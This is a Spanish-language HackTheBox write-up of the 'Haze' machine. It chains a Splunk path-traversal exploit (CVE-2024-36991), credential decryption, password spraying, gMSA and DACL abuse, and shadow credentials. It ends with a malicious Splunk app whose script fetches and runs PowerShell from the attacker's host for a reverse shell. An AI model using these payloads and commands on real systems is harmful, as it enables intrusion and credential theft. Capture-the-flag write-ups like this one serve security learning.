@@ -1,0 +1,668 @@
+---
+title: "Máquina Haze"
+description: "Resolución de la máquina Haze de HackTheBox"
+tags: ["CVE-2024-36991", "Active Directory", "DACL Abuse", "Old files", "Splunk", "SeImpersonatePrivilege"]
+categories: ["HackTheBox", "Hard", "Windows"]
+logo: "/assets/writeups/haze/logo.webp"
+---
+
+Una instancia de Splunk de un controlador de dominio es antigua y posee una vulnerabilidad de lectura de archivos arbitraria. Abusaremos de esto para obtener credenciales de usuarios en el dominio y posteriormente escalar privilegios en el mismo.
+
+## Reconocimiento
+
+La máquina tiene unos cuantos puertos abiertos. Típico de un DC:
+
+```bash
+# Nmap 7.95 scan initiated Sat Mar 29 15:00:33 2025 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.129.228.172
+Nmap scan report for 10.129.228.172
+Host is up, received user-set (0.12s latency).
+Scanned at 2025-03-29 15:00:33 -04 for 40s
+Not shown: 65397 closed tcp ports (reset), 108 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+8000/tcp  open  http-alt         syn-ack ttl 127
+8088/tcp  open  radan-http       syn-ack ttl 127
+8089/tcp  open  unknown          syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49672/tcp open  unknown          syn-ack ttl 127
+49679/tcp open  unknown          syn-ack ttl 127
+49680/tcp open  unknown          syn-ack ttl 127
+55160/tcp open  unknown          syn-ack ttl 127
+55165/tcp open  unknown          syn-ack ttl 127
+55179/tcp open  unknown          syn-ack ttl 127
+55194/tcp open  unknown          syn-ack ttl 127
+58714/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Mar 29 15:01:13 2025 -- 1 IP address (1 host up) scanned in 40.28 seconds
+```
+
+En el puerto 8000 está una instancia de Splunk, de la cual no poseemos credencial alguna para acceder, aún.
+
+![Splunk](/assets/writeups/haze/1.png)
+
+Del resto no podemos utilizar una sesión nula o el usuario guest para ver cosas "públicas" en el DC. Asi que veamos que hacemos con esto.
+
+## Intrusión
+
+### mark.adams && paul.taylor - haze.htb
+
+No tenemos como obtener que versión de Splunk ejecuta el servidor, asi que empezaremos por buscando vulnerabilidades recientes con algún PoC y probarlo a ver si el Splunk es vulnerable.
+
+Buscando por vulnerabilidades, encontramos al `CVE-2024-36991`, que se trata de una vulnerabilidad de lectura arbitraria de archivos de la cual podemos abusar sin tener credenciales previas. Intentando leer el archivo `/etc/passwd` de los archivos de Splunk a ver si está en el rango de versiones vulnerables:
+
+```bash
+❯ curl -v 'http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
+*   Trying 10.10.11.61:8000...
+* Connected to 10.10.11.61 (10.10.11.61) port 8000
+* using HTTP/1.x
+> GET /en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd HTTP/1.1
+> Host: 10.10.11.61:8000
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Fri, 27 Jun 2025 06:22:59 GMT
+< Content-Type: text/html
+< X-Content-Type-Options: nosniff
+< Last-Modified: Wed, 05 Mar 2025 07:40:47 GMT
+< Content-Length: 609
+< Vary: Accept-Encoding, Cookie
+< Connection: Keep-Alive
+< Accept-Ranges: bytes
+< Set-Cookie: session_id_8000=f40a5bcc5c0f2ba0b0bc7b06a640280c8ed1caec; expires=Fri, 27 Jun 2025 07:22:59 GMT; HttpOnly; Max-Age=3600; Path=/
+< Server: Splunkd
+< 
+:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
+:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
+:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
+:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
+```
+
+¡Es vulnerable! Estos hashes podriamos intentar crackearlos pero ningún usuario tiene una contraseña débil. Ahora sabemos que la versión está entre la 9.2.2, 9.1.5 y 9.0.10 o inferiores.
+
+Sin embargo, si nos ponemos explorar directorios de Windows como `C:\Windows`, no encontraremos nada útil que nos permita tomar control de algún usuario. Asi que nos concentraremos en el Splunk únicamente.
+
+La estructura de directorios de Splunk, en forma de un árbol seria la siguiente:
+
+![Splunk directory tree](/assets/writeups/haze/2.png)
+
+`$SPLUNK_HOME -> etc -> system -> local` es un directorio de particular interés, porque es donde los usuarios guardan las modificaciones a los archivos de configuración del servidor. Splunk [tiene una documentación](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.4/configuration-file-reference/9.4.0-configuration-file-reference) describiendo cada archivo de configuración y donde está ubicado.
+
+Hay un archivo llamado `authentication.conf` que se ve jugoso, ya que tiene información de autenticación para ser utilizada por la aplicación. Si intentamos leerlo:
+
+```bash
+❯ curl -v 'http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
+*   Trying 10.10.11.61:8000...
+* Connected to 10.10.11.61 (10.10.11.61) port 8000
+* using HTTP/1.x
+> GET /en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf HTTP/1.1
+> Host: 10.10.11.61:8000
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Fri, 27 Jun 2025 06:43:40 GMT
+< Content-Type: text/html
+< X-Content-Type-Options: nosniff
+< Last-Modified: Wed, 05 Mar 2025 08:07:03 GMT
+< Content-Length: 838
+< Vary: Accept-Encoding, Cookie
+< Connection: Keep-Alive
+< Accept-Ranges: bytes
+< Set-Cookie: session_id_8000=302e973bd76314083595af419f3e271e5bb6b24c; expires=Fri, 27 Jun 2025 07:43:40 GMT; HttpOnly; Max-Age=3600; Path=/
+< Server: Splunkd
+< 
+[splunk_auth]
+minPasswordLength = 8
+minPasswordUppercase = 0
+minPasswordLowercase = 0
+minPasswordSpecial = 0
+minPasswordDigit = 0
+
+[Haze LDAP Auth]
+SSLEnabled = 0
+anonymous_referrals = 1
+bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
+bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
+charset = utf8
+emailAttribute = mail
+enableRangeRetrieval = 0
+groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
+groupMappingAttribute = dn
+groupMemberAttribute = member
+groupNameAttribute = cn
+host = dc01.haze.htb
+nestedGroups = 0
+network_timeout = 20
+pagelimit = -1
+port = 389
+realNameAttribute = cn
+sizelimit = 1000
+timelimit = 15
+userBaseDN = CN=Users,DC=haze,DC=htb
+userNameAttribute = samaccountname
+
+[authentication]
+authSettings = Haze LDAP Auth
+authType = LDAP
+* Connection #0 to host 10.10.11.61 left intact
+```
+
+Se ve como una credencial del dominio. Pero hay un pequeño problema y es que la contraseña está encriptada por Splunk, sin embargo, teniendo acceso al sistema de archivos esto es fácil de contrarrestar.
+
+Este software encripta las credenciales con el contenido de un archivo de texto llamado `splunk.secret`, que está normalmente en `$SPLUNK_HOME/etc/auth/`:
+
+```bash
+❯ curl -v 'http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret'              
+*   Trying 10.10.11.61:8000...
+* Connected to 10.10.11.61 (10.10.11.61) port 8000
+* using HTTP/1.x
+> GET /en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret HTTP/1.1
+> Host: 10.10.11.61:8000
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Fri, 27 Jun 2025 06:47:56 GMT
+< Content-Type: text/html
+< X-Content-Type-Options: nosniff
+< Last-Modified: Wed, 05 Mar 2025 07:29:08 GMT
+< Content-Length: 254
+< Vary: Accept-Encoding, Cookie
+< Connection: Keep-Alive
+< Accept-Ranges: bytes
+< Set-Cookie: session_id_8000=3c3bfd26bc236c6cb7561d1252303853191a4b8f; expires=Fri, 27 Jun 2025 07:47:56 GMT; HttpOnly; Max-Age=3600; Path=/
+< Server: Splunkd
+< 
+* Connection #0 to host 10.10.11.61 left intact
+NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
+```
+
+Podemos utilizar una herramienta llamada [splunk-secrets](https://github.com/HurricaneLabs/splunksecrets) ahora para desencriptar esto con facilidad:
+
+```bash
+❯ splunksecrets splunk-decrypt -S splunk/splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=' 
+Ld@p_Auth_Sp1unk@2k24
+```
+
+y probando por la combinación de nombre y apellido separados por un punto...
+
+```bash
+❯ nxc smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24'
+SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+```
+
+Si enumeramos a los usuarios del sistema y hac-
+
+```bash
+❯ nxc smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --users
+SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                         
+SMB         10.10.11.61     445    DC01             paul.taylor                   2025-06-27 06:51:16 0        
+SMB         10.10.11.61     445    DC01             [*] Enumerated 1 local users: HAZE
+```
+
+Uh... parece que no podemos ver otros usuarios. Pero si probamos a hacer fuerza bruta por el RID
+
+```bash
+❯ nxc smb haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute 10000
+SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)
+SMB         10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)
+SMB         10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)
+SMB         10.10.11.61     445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             513: HAZE\Domain Users (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             525: HAZE\Protected Users (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             526: HAZE\Key Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.61     445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
+SMB         10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
+SMB         10.10.11.61     445    DC01             1112: HAZE\Support_Services (SidTypeGroup)
+```
+
+Como decía, si hacemos password spraying para ver si esta contraseña es reutilizada por alguien más:
+
+```bash
+❯ nxc smb haze.htb -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success 
+SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
+```
+
+### Haze-IT-Backup$ - haze.htb
+
+Si intentamos ver información de la ACLs por Bloodhound de estos usuarios que acabamos de comprometer, veremos que *aparentemente* no tendremos ningún permiso nuevo más que el de `mark.adams` de acceder por WinRM. Sin embargo, si vemos a más bajo nivel con herramientas como bloodyAD la ACL del usuario previamente mencionado:
+
+```bash
+❯ bloodyAD -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb --host dc01.haze.htb get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+permission: WRITE
+```
+
+Si hay algo. Recordatorio de porque hay que investigar bien las cosas.
+
+No podremos encontrar algo interesante por el sistema como `mark.adams` más que unas cuantas carpetas a las cuales no tenemos permisos para acceder. Por lo que vamos a ver más acerca de ese permiso que tenemos sobre la cuenta de servicio administrada:
+
+```bash
+❯ bloodyAD -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb --host dc01.haze.htb get writable --detail
+... [snip]
+distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+msDS-GroupMSAMembership: WRITE
+```
+
+Ese atributo que vemos básicamente le dice al servidor quienes pueden leer la contraseña de esta cuenta. Podemos escribirlo con nuestro usuario simplemente usando el cmdlet `Set-ADServiceAccount` de powershell, estando dentro de WinRM como el usuario:
+
+```bat
+*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword mark.adams
+```
+
+Ahora podremos sacar el hash de la contraseña sin problemas
+
+```bash
+❯ gmsadumper.py -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb
+Users or groups who can read password for Haze-IT-Backup$:
+ > mark.adams
+Haze-IT-Backup$:::4de830d1d58c14e241aff55f82ecdba1
+Haze-IT-Backup$:aes256-cts-hmac-sha1-96:cd4412d359a30ff985a770ea7f036f5839bd8fc3fad372fef4ab3aeffbea8783
+Haze-IT-Backup$:aes128-cts-hmac-sha1-96:7b8eb6300e7eebc3593607ecce5d7050
+```
+
+### edward.martin - haze.htb
+
+Esta cuenta de servicio puede escribir el propietario de este grupo:
+
+![WriteOwner](/assets/writeups/haze/3.png)
+
+Del resto *aparentemente* no hay otra cosa, pero igual puede haber una entrada de la DACL de otro objeto que no podamos ver.
+
+Sobrescribiendo al propietario del grupo y dándonos GenericAll sobre el mismo para agregarnos:
+
+```bash
+❯ bloodyAD -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' -d haze.htb --host dc01.haze.htb set owner Support_Services 'Haze-IT-Backup$'
+[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services
+
+❯ bloodyAD -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' -d haze.htb --host dc01.haze.htb add genericAll Support_Services 'Haze-IT-Backup$'
+[+] Haze-IT-Backup$ has now GenericAll on Support_Services
+
+❯ bloodyAD -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' -d haze.htb --host dc01.haze.htb add groupMember Support_Services 'Haze-IT-Backup$'
+[+] Haze-IT-Backup$ added to Support_Services
+```
+
+Veremos que ahora tendremos un nuevo permiso de escritura sobre un atributo muy "jiji" de `edward.martin`:
+
+```bash
+❯ bloodyAD -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' -d haze.htb --host dc01.haze.htb get writable --detail      
+
+distinguishedName: CN=TPM Devices,DC=haze,DC=htb
+msTPM-InformationObject: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
+url: WRITE
+wWWHomePage: WRITE
+
+distinguishedName: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+msDS-KeyCredentialLink: WRITE
+```
+
+Podemos aprovecharnos del mismo fácilmente con `certipy` para obtener su hash NTLM:
+
+```bash
+❯ certipy shadow add -u 'Haze-IT-Backup$@haze.htb' -hashes ':4de830d1d58c14e241aff55f82ecdba1' -target-ip 10.10.11.61 -account edward.martin
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: HAZE.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '8bf3dcc2-b3af-8f52-9bbd-1ae2027b690c'
+[*] Adding Key Credential with device ID '8bf3dcc2-b3af-8f52-9bbd-1ae2027b690c' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '8bf3dcc2-b3af-8f52-9bbd-1ae2027b690c' to the Key Credentials for 'edward.martin'
+[*] Saving certificate and private key to 'edward.martin.pfx'
+[*] Saved certificate and private key to 'edward.martin.pfx'
+
+❯ certipy auth -username edward.martin -domain haze.htb -ns 10.10.11.61 -dc-ip dc01.haze.htb -pfx edward.martin.pfx 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Got hash for 'edward.martin@haze.htb': aad3b435b51404eeaad3b435b51404ee:09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+Este usuario pertenece al grupo de administración remota, por lo que podremos acceder por WinRM como el mismo. En su escritorio podremos encontrar la primera flag:
+
+```bash
+❯ evil-winrm -u edward.martin -H "09e0b3eeb2e7a6b0d419e9ff8f4d91af" -i dc01.haze.htb
+Evil-WinRM shell v3.6
+                                      
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\edward.martin\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\edward.martin\Desktop> ls -Force
+
+
+    Directory: C:\Users\edward.martin\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         6/26/2025  11:02 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\edward.martin\Desktop> type user.txt
+38285836d71db0f991a06d64c4******
+```
+
+## Escalada de privilegios
+
+
+### alexander.green - Splunk
+
+Somos parte del grupo de revisores de backups:
+
+```bat
+*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                         Attributes
+=========================================== ================ =========================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
+HAZE\Backup_Reviewers                       Group            S-1-5-21-323145914-28650650-2368316563-1109 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+
+Perteneciendo a este grupo ahora podremos acceder al directorio `C:\Backups`, el cual parece contener un backup del Splunk:
+
+```bat
+*Evil-WinRM* PS C:\Backups\Splunk> ls -Force
+
+
+    Directory: C:\Backups\Splunk
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
+```
+
+Copiándolo a nuestro equipo y luego extrayéndolo, veremos el sistema de archivos principal de dicha aplicación:
+
+```bash
+❯ ls -al
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 22:52:06 2024  .
+drwxr-xr-x vzon vzon 4.0 KB Fri Jun 27 03:59:19 2025  ..
+drwxr-xr-x vzon vzon  12 KB Tue Aug  6 15:26:34 2024  bin
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:26:34 2024  cmake
+.rw-r--r-- vzon vzon  58 B  Thu Mar 21 00:38:24 2024  copyright.txt
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:24:08 2024  etc
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:24:08 2024  lib
+.rw-r--r-- vzon vzon 325 KB Thu Mar 21 00:38:24 2024  license-eula.rtf
+.rw-r--r-- vzon vzon  85 KB Thu Mar 21 00:38:24 2024  license-eula.txt
+.rw-r--r-- vzon vzon  11 KB Thu Mar 21 00:41:30 2024  openssl.cnf
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:24:12 2024  opt
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 22:52:26 2024  Python-3.7
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:25:10 2024  quarantined_files
+.rw-r--r-- vzon vzon 532 B  Thu Mar 21 00:48:12 2024  README-splunk.txt
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 22:53:06 2024  share
+.rw-r--r-- vzon vzon 3.0 MB Thu Mar 21 01:30:04 2024  splunk-9.2.1-78803f08aabb-windows-64-manifest
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:26:16 2024  swidtag
+drwxr-xr-x vzon vzon 4.0 KB Tue Aug  6 15:26:30 2024  var
+```
+
+Es un sistema de archivos extenso, sin embargo, luego de pasar un buen rato buscando encontraremos una copia instántanea de una vieja versión de `authentication.conf` en `var/run/splunk/confsnapshot/baseline_local/system/local`:
+
+```conf
+[default]
+
+minPasswordLength = 8
+minPasswordUppercase = 0
+minPasswordLowercase = 0
+minPasswordSpecial = 0
+minPasswordDigit = 0
+
+
+[Haze LDAP Auth]
+
+SSLEnabled = 0
+anonymous_referrals = 1
+bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
+bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
+charset = utf8
+emailAttribute = mail
+enableRangeRetrieval = 0
+groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
+groupMappingAttribute = dn
+groupMemberAttribute = member
+groupNameAttribute = cn
+host = dc01.haze.htb
+nestedGroups = 0
+network_timeout = 20
+pagelimit = -1
+port = 389
+realNameAttribute = cn
+sizelimit = 1000
+timelimit = 15
+userBaseDN = CN=Users,DC=haze,DC=htb
+userNameAttribute = samaccountname
+
+[authentication]
+authSettings = Haze LDAP Auth
+authType = LDAP
+```
+{: file="var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf"}
+
+Está encriptada utilizando el viejo formato de Splunk (pre 7.2), se lo especificaremos a la herramienta para que la desencripte:
+
+```bash
+❯ splunksecrets splunk-legacy-decrypt -S ../../../../../../../etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
+Sp1unkadmin@2k24
+```
+
+Con esta contraseña ahora podremos acceder al splunk que vimos al inicio como el usuario `admin`:
+
+![Splunk page](/assets/writeups/haze/4.png)
+
+### Administrator - haze.htb
+
+Como somo administrador en el Splunk, simplemente podemos instalar una app maliciosa que nos de ejecución de comandos y así obtener acceso como el usuario que corre el servidor, que es muy probable que tenga privilegios especiales como el `SeImpersonatePrivilege`.
+
+Voy a utilizar una versión modificada de [splunk_shells](https://github.com/TBGSecurity/splunk_shells) para que el archivo `bin/rev_shell.py` (el que se ejecutará cuando intentes hacer una busqueda con la app) me mande una reverse shell directamente. Usaré el script ConPtyShell
+
+```py
+import os
+
+os.system("powershell IEX((New-Object Net.WebClient).DownloadString('http://10.10.16.x:8000/uwu'))")
+```
+{: file="bin/rev_shell.py" }
+
+Yendo a `Apps -> Manage Apps -> Install App from file` podremos instalar dicha app sin problemas, luego tendremos que hacerla visible simplemente editando sus propiedades en el mismo apartado. Finalmente podremos ejecutarla y escribir lo siguiente para lanzarnos una reverse shell:
+
+> Si no te deja ejecutar ninguna búsqueda, es porque el espacio disponible en el sistema es inferior al mínimo que el Splunk por defecto "necesita" para hacer las busquedas. Puedes reducirle el mínimo en `Server Settings -> General Settings -> Pause indexing if free disk space (in MB) falls below`. Reinicia el servidor luego de hacerlo para aplicar los cambios.
+{: .prompt-tip } 
+
